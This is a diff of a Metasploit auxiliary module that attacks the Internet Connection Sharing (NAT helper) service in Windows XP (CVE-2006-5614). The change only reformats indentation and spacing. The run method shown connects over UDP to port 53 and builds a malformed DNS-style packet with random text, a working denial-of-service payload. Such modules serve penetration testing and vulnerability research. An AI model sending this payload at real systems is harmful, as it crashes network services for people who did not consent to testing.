@@ -8,30 +8,33 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Microsoft Windows NAT Helper Denial of Service',
-      'Description'    => %q{
-        This module exploits a denial of service vulnerability
-        within the Internet Connection Sharing service in
-        Windows XP.
-      },
-      'Author'         => [ 'MC' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Microsoft Windows NAT Helper Denial of Service',
+        'Description' => %q{
+          This module exploits a denial of service vulnerability
+          within the Internet Connection Sharing service in
+          Windows XP.
+        },
+        'Author' => [ 'MC' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'OSVDB', '30096'],
           [ 'BID', '20804' ],
           [ 'CVE', '2006-5614' ],
         ],
-      'DisclosureDate' => '2006-10-26'))
+        'DisclosureDate' => '2006-10-26'
+      )
+    )
 
-      register_options([Opt::RPORT(53),])
+    register_options([Opt::RPORT(53),])
   end
 
   def run
     connect_udp
 
-    pkt =  "\x6c\xb6\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    pkt = "\x6c\xb6\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     pkt << "\x03" + Rex::Text.rand_text_english(3) + "\x06"
     pkt << Rex::Text.rand_text_english(10) + "\x03"
     pkt << Rex::Text.rand_text_english(3)
